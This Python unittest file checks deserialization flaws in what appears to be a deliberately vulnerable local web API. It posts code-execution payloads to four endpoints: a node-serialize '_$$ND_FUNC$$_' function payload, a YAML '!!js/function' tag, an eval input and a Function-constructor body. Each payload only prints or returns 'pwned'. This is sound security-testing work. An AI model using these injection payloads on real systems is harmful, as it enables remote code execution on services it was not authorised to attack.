#!/usr/bin/env python3
import os
import unittest

import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
API_URL = os.getenv("API_URL", "http://localhost:3001")


class DeserializationTest(unittest.TestCase):
    """Test cases for deserialization vulnerabilities"""

    def setUp(self):
        """Set up test environment"""
        self.base_url = API_URL
        self.headers = {"Content-Type": "application/json"}

    def test_01_node_serialize_rce(self):
        """Test node-serialize RCE vulnerability"""
        # Payload that executes 'console.log("pwned")'
        payload = {
            "data": '{"rce":"_$$ND_FUNC$$_function(){console.log(\\"pwned\\")}()"}'
        }

        response = requests.post(
            f"{self.base_url}/api/deserialize/node-serialize",
            json=payload,
            headers=self.headers,
        )

        self.assertEqual(
            response.status_code, 200, "Node-serialize endpoint should be accessible"
        )
        self.assertIn(
            "result", response.json(), "Response should contain 'result' field"
        )

    def test_02_yaml_deserialization(self):
        """Test YAML deserialization vulnerability"""
        # Start with a simple YAML object
        payload = {
            "data": "!!map\n  fn: !!js/function 'function() { return \"pwned\"; }'\n  value: test"
        }

        response = requests.post(
            f"{self.base_url}/api/deserialize/yaml", json=payload, headers=self.headers
        )

        self.assertEqual(
            response.status_code, 200, "YAML endpoint should be accessible"
        )
        self.assertIn(
            "result", response.json(), "Response should contain 'result' field"
        )

    def test_03_eval_deserialization(self):
        """Test eval-based deserialization vulnerability"""
        # Payload that executes through eval and returns a value
        payload = {"data": '({result: "pwned"})'}

        response = requests.post(
            f"{self.base_url}/api/deserialize/eval", json=payload, headers=self.headers
        )

        self.assertEqual(
            response.status_code, 200, "Eval endpoint should be accessible"
        )
        self.assertIn(
            "result", response.json(), "Response should contain 'result' field"
        )
        self.assertEqual(
            response.json()["result"]["result"],
            "pwned",
            "Result should contain the returned value",
        )

    def test_04_function_constructor(self):
        """Test Function constructor vulnerability"""
        # Payload that executes through Function constructor
        payload = {"data": 'return "pwned"'}

        response = requests.post(
            f"{self.base_url}/api/deserialize/function",
            json=payload,
            headers=self.headers,
        )

        self.assertEqual(
            response.status_code,
            200,
            "Function constructor endpoint should be accessible",
        )
        self.assertIn(
            "result", response.json(), "Response should contain 'result' field"
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
